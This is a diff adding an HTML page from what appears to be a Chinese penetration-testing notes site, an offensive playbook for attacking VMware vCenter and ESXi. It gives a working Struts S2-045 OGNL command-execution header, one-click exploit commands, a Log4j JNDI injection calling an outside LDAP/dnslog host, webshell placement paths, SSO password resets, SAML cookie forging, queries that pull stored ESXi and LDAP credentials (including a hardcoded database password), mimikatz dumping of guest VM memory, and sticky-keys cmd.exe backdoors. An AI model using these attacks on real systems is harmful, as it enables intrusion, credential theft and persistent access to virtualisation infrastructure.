@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Vcenter攻击面 - Share Docs</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5b89\u88c5", url: "#_top", children: [
+              {title: "ESXI\u5b89\u88c5", url: "#esxi" },
+              {title: "vCenter\u5b89\u88c5", url: "#vcenter" },
+          ]},
+          {title: "\u67e5\u770b\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "ESXI\u64cd\u4f5c", url: "#esxi_1", children: [
+          ]},
+          {title: "\u6f0f\u6d1e", url: "#_3", children: [
+              {title: "\u4e00\u952e\u5316\u653b\u51fb", url: "#_4" },
+              {title: "S2-045", url: "#s2-045" },
+              {title: "CVE-2021-21972-\u6587\u4ef6\u4e0a\u4f20", url: "#cve-2021-21972-" },
+              {title: "CVE-2021-21985-JNDI-RCE", url: "#cve-2021-21985-jndi-rce" },
+              {title: "CVE-2021-22005-\u6587\u4ef6\u4e0a\u4f20", url: "#cve-2021-22005-" },
+              {title: "Log4j2", url: "#log4j2" },
+          ]},
+          {title: "\u672c\u5730\u63d0\u6743", url: "#_5", children: [
+              {title: "CVE-2021-3156", url: "#cve-2021-3156" },
+          ]},
+          {title: "\u8fdbweb\u540e\u53f0", url: "#web", children: [
+              {title: "\u91cd\u7f6eweb\u540e\u53f0\u5bc6\u7801", url: "#web_1" },
+              {title: "saml\u8bc1\u4e66\u63d0\u53d6\u53ef\u767b\u5f55\u7684cookie", url: "#samlcookie" },
+              {title: "ldap\u7ba1\u7406\u7528\u6237", url: "#ldap" },
+          ]},
+          {title: "\u83b7\u53d6\u865a\u62df\u673a\u6743\u9650", url: "#_6", children: [
+              {title: "\u4ece\u5feb\u7167\u63d0\u53d6\u865a\u62df\u673a\u7684hash", url: "#hash" },
+              {title: "\u5728ESXI\u672c\u5730\u63d0\u53d6hash", url: "#esxihash" },
+              {title: "\u6302\u8f7dkon-boot\u7ed5\u8fc7\u9a8c\u8bc1", url: "#kon-boot" },
+              {title: "\u5728\u865a\u62df\u673a\u4e0a\u6302PE\u7cfb\u7edf", url: "#pe" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Windows%E6%8A%80%E5%B7%A7/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Windows%E6%8A%80%E5%B7%A7/" class="btn btn-xs btn-link">
+        Windows技巧
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../MSF%E5%91%BD%E4%BB%A4/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../MSF%E5%91%BD%E4%BB%A4/" class="btn btn-xs btn-link">
+        MSF命令
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="_1">安装</h2>
+<h3 id="esxi">ESXI安装</h3>
+<p>需要在一个未安装系统的电脑（虚拟机）上安装，安装过程就是同意同意，最后输入root密码，最后登录web使用web界面进行管理。</p>
+<p>安装完成如图所示</p>
+<p>管理界面如图所示
+<img alt="" src="../../images/20230523150608.png" /></p>
+<p><img alt="" src="../../images/20230523150626.png" /></p>
+<h3 id="vcenter">vCenter安装</h3>
+<p>vCenter是用来管控多个ESXI的，单个ESXI没必要使用vCenter。</p>
+<p>常规安装方式是需要连接到ESXI安装，相当于在ESXI安装了一台vCenter的虚拟机。直接下一步下一步就行了。第一阶段中的root密码是vCenter虚拟机的密码，第二阶段SSO的密码是web的登录密码。</p>
+<p>比较特殊的安装方式是将vCenter中的ova文件直接导入到虚拟机中，这里可以不用连上ESXI，需要配置一下root密码。
+<img alt="" src="../../images/20230523150716.png" />
+导入完成后访问5480端口进行配置，配置完成后可以直接登录。
+<img alt="" src="../../images/20230523150728.png" /></p>
+<h2 id="_2">查看版本</h2>
+<pre><code class="language-text-plain">POST /sdk HTTP/1.1
+Host: 192.168.25.137
+Cookie: XSRF-TOKEN=LUkPdkLESf6o7foIvzQgQpeGEEVV5mEb; appliance-ui-sessionid=M2QzYzgxZjYtZGQzNy00MmRjLTk4MzYtZjkwNTRlMjRmZGNi; JSESSIONID=AE593F8A3615F7C04EA53A1F13F77F58
+Cache-Control: max-age=0
+Content-Length: 373
+
+&lt;env:Envelope xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:env=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
+      &lt;env:Body&gt;
+      &lt;RetrieveServiceContent xmlns=&quot;urn:vim25&quot;&gt;
+        &lt;_this type=&quot;ServiceInstance&quot;&gt;ServiceInstance&lt;/_this&gt;
+      &lt;/RetrieveServiceContent&gt;
+      &lt;/env:Body&gt;
+      &lt;/env:Envelope&gt;
+</code></pre>
+<p><img alt="" src="../../images/20230523150751.png" />
+详细版本号可在官网查询</p>
+<p>https://kb.vmware.com/s/article/2143838?lang=zh_CN</p>
+<h2 id="esxi_1">ESXI操作</h2>
+<pre><code>esxcli network ip interface list
+
+esxcli network ip interface ipv4 get -i vmk&lt;X&gt;
+
+esxcli network ip interface ipv6 get -n vmk&lt;X&gt;
+
+esxcli network ip interface ipv6 address list
+
+You can retrieve information about DNS with the esxcli network ip dns command in the following two namespaces:
+
+esxcli network ip dns search
+
+esxcli network ip dns server
+
+For information corresponding to the Linux netstat command, use the following ESXCLI command.
+
+esxcli network ip connection list
+
+</code></pre>
+<h2 id="_3">漏洞</h2>
+<h3 id="_4">一键化攻击</h3>
+<pre><code class="language-text-plain">python2 vCenterExploit.py -s -u https://190.0.0.1:2443
+
+python2 vCenterExploit.py -u https://190.0.0.2:3443 -o unix -c &quot;id&quot;
+
+python2 vCenterExploit.py -u https://190.0.0.2:2443 -log4j '${jndi:ldap://192.68.25.1:1389/${sys:java.version}}'
+
+python2 vCenterExploit.py -u https://190.0.0.2:2443 -shell -o unix -f shell.jsp
+</code></pre>
+<h3 id="s2-045">S2-045</h3>
+<pre><code class="language-text-plain">GET /statsreport/ HTTP/1.1
+Host: vcenter:443
+Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+Connection: close
+Content-Length: 0
+</code></pre>
+<h3 id="cve-2021-21972-">CVE-2021-21972-文件上传</h3>
+<p>漏洞触发点</p>
+<pre><code class="language-text-plain">/ui/vropspluginui/rest/services/uploadova
+</code></pre>
+<p>上传的物理路径是</p>
+<pre><code class="language-text-plain">/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/
+</code></pre>
+<p>路径不一定通用，需要枚举。</p>
+<p>web访问路径是/ui/resources/xx.jsp</p>
+<p>使用脚本上传直接枚举路径，获取的是ui权限，需要提权到root。</p>
+<h3 id="cve-2021-21985-jndi-rce">CVE-2021-21985-JNDI-RCE</h3>
+<p>jndi需要bypass jdk的高版本，直接脚本打。</p>
+<p>获取的是ui权限，需要提权到root</p>
+<h3 id="cve-2021-22005-">CVE-2021-22005-文件上传</h3>
+<p>脚本直接打，获取的是root权限。文件上传到了</p>
+<p><code>/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/</code></p>
+<p>这个路径需要root权限才可操作。</p>
+<p>web访问路径是/idm/..;/xx.jsp</p>
+<h3 id="log4j2">Log4j2</h3>
+<pre><code class="language-text-plain">curl --insecure  -vv -H &quot;X-Forwarded-For: \\${jndi:ldap://vcentertest.fccszs.dnslog.cn:1389/lol}&quot; &quot;https://10.100.100.5/websso/SAML2/SSO/vcenter.lab?SAMLRequest=&quot;
+</code></pre>
+<h2 id="_5">本地提权</h2>
+<h3 id="cve-2021-3156">CVE-2021-3156</h3>
+<p>原版<code>exploit_defaults_mailer.py.yuanban</code></p>
+<p>修改版<code>vCenter_privilege_escalation.py</code>，直接在<code>/usr/lib/vmware-sso/vmware-sts/webapps/openidconnect/</code>写一个webshell。访问路径是</p>
+<p>http://xxxx/vmware-sts/openidconnect/xxx.jsp</p>
+<h2 id="web">进web后台</h2>
+<h3 id="web_1">重置web后台密码</h3>
+<p>获取root权限后使用vmafd-cli查询域名</p>
+<p>vsphere.local 域用户在 <strong>vCenter 5.5</strong> 版本上的密码稍有变化，需要提供 <code>cn=administrator.cn=users.dc=vsphere.dc=local</code> 的格式的帐户 DN 而不是帐户 UPN。</p>
+<p>旧版本的 <strong>vCenter 5.1</strong>，则可以转到 <strong>/usr/lib/vmware-sso/utils</strong> 文件夹，运行命令 <strong>./rsutil reset-admin-password</strong>，输入主密码（这是 root 密码），然后输入要重置的 SSO 管理员名称，例如：<strong>admin</strong>。出现提示时键入新密码，它将显示<em>"密码重置成功"</em>消息</p>
+<p><code>/usr/lib/vmware-vmafd/bin/vmafd-cli get-domain-name --server-name localhost</code></p>
+<p>使用<code>/usr/lib/vmware-vmdir/bin/vdcadmintool</code>重置密码</p>
+<p>Windows 版本的vCenter上，使用命令行工具进入到 <code>%VMWARE_CIS_HOME%\vmdird\</code> 目录下，执行 <code>vdcadmintool.exe</code> 程序。</p>
+<p>linux<strong>一句话重置：</strong><code>**(echo "3"&amp;&amp;sleep 1&amp;&amp;echo "administrator@vsphere.local") | /usr/lib/vmware-vmdir/bin/vdcadmintool**</code></p>
+<p>Windows和Linux都可以使用python脚本直接重置</p>
+<p><code>vCenterResetPassword.py</code></p>
+<h3 id="samlcookie">saml证书提取可登录的cookie</h3>
+<p>https://github.com/horizon3ai/vcenter_saml_login</p>
+<p>python-ldap有点搞</p>
+<p>先安装</p>
+<pre><code class="language-text-plain">apt-get install build-essential python3-dev python2.7-dev \
+    libldap2-dev libsasl2-dev slapd ldap-utils tox \
+    lcov valgrind
+</code></pre>
+<p>再安装</p>
+<p><code>pip install python-ldap</code></p>
+<p>找到data.mdb</p>
+<p>Linux:</p>
+<p>Windows</p>
+<p>运行获得cookie</p>
+<p><code>python3 vcenter_saml_login.py -p data.mdb -t 192.168.25.137</code>
+<img alt="" src="../../images/20230523150826.png" /></p>
+<h3 id="ldap">ldap管理用户</h3>
+<p>首先需要获取ldap管理员的密码才能够添加用户</p>
+<p>密码保存文件位置</p>
+<pre><code class="language-text-plain"># Linux
+/var/lib/likewise/db/active.db
+/var/lib/likewise/db/registry.db
+/storage/service-state/likewise/registry.db
+
+# Windows
+reg query &quot;HKLM\SYSTEM\CurrentControlSet\services\VMwareDirectoryService&quot; /v dcAccount
+reg query &quot;HKLM\SYSTEM\CurrentControlSet\services\VMwareDirectoryService&quot; /v dcAccountDN
+reg query &quot;HKLM\SYSTEM\CurrentControlSet\services\VMwareDirectoryService&quot; /v dcAccountPassword
+</code></pre>
+<p>直接查询ldap管理员密码</p>
+<pre><code class="language-text-plain">/opt/likewise/bin/lwregshell list_values [HKEY_THIS_MACHINE\\services\\vmdir]
+</code></pre>
+<p><code>vCenterLDAPManage_linux_python3.py</code>可以在本地直接加用户</p>
+<p><code>vCenter_addUser_remotely_python3.py</code>可以远程加用户，Linux需要下载db文件，Windows需要指定密码</p>
+<h2 id="_6">获取虚拟机权限</h2>
+<h3 id="hash">从快照提取虚拟机的hash</h3>
+<p>列出虚拟机</p>
+<pre><code class="language-text-plain">SharpSphere.exe list --url https://192.168.25.134/sdk --username administrator@test.com --password &quot;!QAZ2wsx&quot;
+</code></pre>
+<p><img alt="" src="../../images/20230523150843.png" />
+下载指定虚拟机的快照，如不存在快照需要创建</p>
+<p>创建可以web后台创建，也可以用此工具创建，在下载后指定<code>--snapshot</code>代表先创建一个快照然后下载。</p>
+<pre><code class="language-text-plain">SharpSphere.exe dump --url https://192.168.25.134/sdk --username administrator@test.com --password &quot;!QAZ2wsx&quot; --targetvm win10 --destination C:\Users\admin\Desktop\vcneter
+</code></pre>
+<p><img alt="" src="../../images/20230523150906.png" />
+下载后会生成一个大文件和一个小文件，一个4G的和一个3.5M的，大文件大小跟内存有关。</p>
+<p>使用<a href="https://flings.vmware.com/vmss2core?download_url=https%3A%2F%2Fdownload3.vmware.com%2Fsoftware%2Fvmw-tools%2Fvmss2core%2Fvmss2core-sb-8456865.exe">vmss2corex</a>来提取</p>
+<p>win8及以上的系统需要加<code>-W8</code>参数，其他直接<code>-W</code></p>
+<p>先指定小文件，再指定大文件</p>
+<pre><code class="language-text-plain">vmss2core-sb-8456865.exe -W8 zs5k2ypj.uhv 1lagz1jn.xae
+</code></pre>
+<p><img alt="" src="../../images/20230523150918.png" />
+将生成的dmp拖到windbg中调试。<strong>windbg最好用</strong><a href="https://developer.microsoft.com/zh-cn/windows/downloads/sdk-archive/"><strong>sdk</strong></a><strong>工具安装，不然会有问题。</strong></p>
+<p>加载mimikatz</p>
+<p><code>.load C:\mimilib.dll</code></p>
+<p>定位lsass.exe进程地址，运行mimikatz</p>
+<pre><code class="language-text-plain">0: kd&gt; !process 0 0 lsass.exe
+Unable to get program counter
+PROCESS ffffb408bbedb080
+    SessionId: 0  Cid: 0260    Peb: 539cc78000  ParentCid: 01d0
+    DirBase: 11b652000  ObjectTable: ffff860f79142d40  HandleCount: 1135.
+    Image: lsass.exe
+
+0: kd&gt; .process /r /p ffffb408bbedb080
+Implicit process is now ffffb408`bbedb080
+Loading User Symbols
+................................................................
+....................
+0: kd&gt; !mimikatz
+</code></pre>
+<p>或者下载好快照vmem文件后，使用volatility提取。</p>
+<p><code>volatility_2.6_win64_standalone.exe -f xxx.vmem --profile=系统架构 lsadump</code></p>
+<h3 id="esxihash">在ESXI本地提取hash</h3>
+<p>原则上还是利用快照提取，只不过是在本地直接提取，不用下载快照。</p>
+<p>假设当前有vCenter的权限，但是快照存在ESXI上面，需要获取ESXI的权限并且ESXI开启了SSH服务。</p>
+<p>如果ESXI没有开启ssh，可以在vCenter中开启。
+<img alt="" src="../../images/20230523150935.png" />
+postgresql数据库配置文件：</p>
+<pre><code class="language-text-plain">C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx
+/etc/vmware-vpx/vcdb.properties
+
+psql -h localhost -d VCDB -U vc
+</code></pre>
+<pre><code class="language-text-plain">查询虚拟机
+SELECT id,datacenter_id,file_name,guest_os,ip_address,config FROM vc.vpx_vm;
+
+查询ESXI用户密码
+SELECT name,username,password,password_last_upd_dt FROM vc.vpxv_hosts;
+
+一键查询导出vpsuser用户密码
+psql -h 127.0.0.1 -p 5432 -U vc -w HKJrm8yP2)aDWptU -d VCDB -c &quot;select ip_address,user_name,password from vpx_host;&quot; &gt; password.enc
+</code></pre>
+<p><img alt="" src="../../images/20230523151007.png" />
+解密vpxuser密码，如果有root就可以直接登录root</p>
+<pre><code class="language-text-plain"># Windows
+C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\ssl\symkey.dat
+
+# Linux
+/etc/vmware-vpx/ssl/symkey.dat
+</code></pre>
+<p>给虚拟机打好快照后，用volatility读取内存快照</p>
+<pre><code class="language-text-plain">./volatility -f /vmfs/volumes/620b3190-c2d721da-84e5-000c29395ece/win10/win10-Snapshot1.vmem --profile=win1
+0x64 hashdump
+</code></pre>
+<p>注意profile参数对应的平台</p>
+<pre><code class="language-text-plain">Profiles
+--------
+VistaSP0x64           - A Profile for Windows Vista SP0 x64
+VistaSP0x86           - A Profile for Windows Vista SP0 x86
+VistaSP1x64           - A Profile for Windows Vista SP1 x64
+VistaSP1x86           - A Profile for Windows Vista SP1 x86
+VistaSP2x64           - A Profile for Windows Vista SP2 x64
+VistaSP2x86           - A Profile for Windows Vista SP2 x86
+Win10x64              - A Profile for Windows 10 x64
+Win10x64_10586        - A Profile for Windows 10 x64 (10.0.10586.306 / 2016-04-23)
+Win10x64_14393        - A Profile for Windows 10 x64 (10.0.14393.0 / 2016-07-16)
+Win10x86              - A Profile for Windows 10 x86
+Win10x86_10586        - A Profile for Windows 10 x86 (10.0.10586.420 / 2016-05-28)
+Win10x86_14393        - A Profile for Windows 10 x86 (10.0.14393.0 / 2016-07-16)
+Win2003SP0x86         - A Profile for Windows 2003 SP0 x86
+Win2003SP1x64         - A Profile for Windows 2003 SP1 x64
+Win2003SP1x86         - A Profile for Windows 2003 SP1 x86
+Win2003SP2x64         - A Profile for Windows 2003 SP2 x64
+Win2003SP2x86         - A Profile for Windows 2003 SP2 x86
+Win2008R2SP0x64       - A Profile for Windows 2008 R2 SP0 x64
+Win2008R2SP1x64       - A Profile for Windows 2008 R2 SP1 x64
+Win2008R2SP1x64_23418 - A Profile for Windows 2008 R2 SP1 x64 (6.1.7601.23418 / 2016-04-09)
+Win2008SP1x64         - A Profile for Windows 2008 SP1 x64
+Win2008SP1x86         - A Profile for Windows 2008 SP1 x86
+Win2008SP2x64         - A Profile for Windows 2008 SP2 x64
+Win2008SP2x86         - A Profile for Windows 2008 SP2 x86
+Win2012R2x64          - A Profile for Windows Server 2012 R2 x64
+Win2012R2x64_18340    - A Profile for Windows Server 2012 R2 x64 (6.3.9600.18340 / 2016-05-13)
+Win2012x64            - A Profile for Windows Server 2012 x64
+Win2016x64_14393      - A Profile for Windows Server 2016 x64 (10.0.14393.0 / 2016-07-16)
+Win7SP0x64            - A Profile for Windows 7 SP0 x64
+Win7SP0x86            - A Profile for Windows 7 SP0 x86
+Win7SP1x64            - A Profile for Windows 7 SP1 x64
+Win7SP1x64_23418      - A Profile for Windows 7 SP1 x64 (6.1.7601.23418 / 2016-04-09)
+Win7SP1x86            - A Profile for Windows 7 SP1 x86
+Win7SP1x86_23418      - A Profile for Windows 7 SP1 x86 (6.1.7601.23418 / 2016-04-09)
+Win81U1x64            - A Profile for Windows 8.1 Update 1 x64
+Win81U1x86            - A Profile for Windows 8.1 Update 1 x86
+Win8SP0x64            - A Profile for Windows 8 x64
+Win8SP0x86            - A Profile for Windows 8 x86
+Win8SP1x64            - A Profile for Windows 8.1 x64
+Win8SP1x64_18340      - A Profile for Windows 8.1 x64 (6.3.9600.18340 / 2016-05-13)
+Win8SP1x86            - A Profile for Windows 8.1 x86
+WinXPSP1x64           - A Profile for Windows XP SP1 x64
+WinXPSP2x64           - A Profile for Windows XP SP2 x64
+WinXPSP2x86           - A Profile for Windows XP SP2 x86
+WinXPSP3x86           - A Profile for Windows XP SP3 x86
+</code></pre>
+<h3 id="kon-boot">挂载kon-boot绕过验证</h3>
+<p>2.7版本只适用win7及以下</p>
+<h3 id="pe">在虚拟机上挂PE系统</h3>
+<p>这种操作跟重装系统一样，挂一个PE，从PE启动。</p>
+<p>注意虚拟机的系统，确定是UEFI启动还是BIOS启动，一般win8以上的系统都是UEFI启动，注意调成ISO对应的启动方式。
+<img alt="" src="../../images/20230523151025.png" />
+<img alt="" src="../../images/20230523151030.png" />
+进入PE后可以随心所欲了，PE系统提供了一个直接修改用户密码的工具。
+<img alt="" src="../../images/20230523151050.png" />
+如果要获取当前用户的密码，需要把工具弄上去，但是虚拟机无法进行文件交互，所以只能将工具拖到PE镜像里去，让他自己加载。</p>
+<p>由于一开始用的PE系统是32位的，工具各种都用不了，后面又找了一个64位的PE系统，然后用之前的引导程序成功加载64位PE。</p>
+<p>找到PE系统中的WIM文件，用压缩包打开，要什么工具直接往里拖。
+<img alt="" src="../../images/20230523151106.png" />
+随后用UltraISO重新打包成ISO
+<img alt="" src="../../images/20230523151117.png" />
+进入PE系统后把工具拖出来直接用，需要注意的是运行工具会报缺少dll，这个时候需要把cmd目录切换到system32下，或者将C盘system32目录加到PE系统的环境变量下。
+随后导出SAM和SYSTEM直接提取hash</p>
+<p>最好直接使用system32\config目录下的SAM和system，信息比较完全，这里没有提到NTLM，不知道是什么情况
+<img alt="" src="../../images/20230523151137.png" />
+还可以加个后门，为所欲为</p>
+<pre><code class="language-text-plain">move c:\windows\system32\Magnify.exe c:\windows\system32\Magnify1.exe
+move C:\windows\system32\Utilman.exe C:\windows\system32\Utilman1.exe
+move C:\windows\system32\osk.exe C:\windows\system32\osk1.exe
+move C:\windows\system32\sethc.exe C:\windows\system32\sethc1.exe
+copy c:\windows\system32\cmd.exe c:\windows\system32\Magnify.exe
+copy C:\windows\system32\cmd.exe C:\windows\system32\Utilman.exe
+copy C:\windows\system32\cmd.exe C:\windows\system32\osk.exe
+copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe
+</code></pre>
+<pre><code class="language-text-plain">C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
+</code></pre>
+<pre><code class="language-text-plain">/storage/db/vmware-vmdir/data.mdb
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Windows%E6%8A%80%E5%B7%A7/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Windows%E6%8A%80%E5%B7%A7/" class="btn btn-xs btn-link">
+        Windows技巧
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../MSF%E5%91%BD%E4%BB%A4/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../MSF%E5%91%BD%E4%BB%A4/" class="btn btn-xs btn-link">
+        MSF命令
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
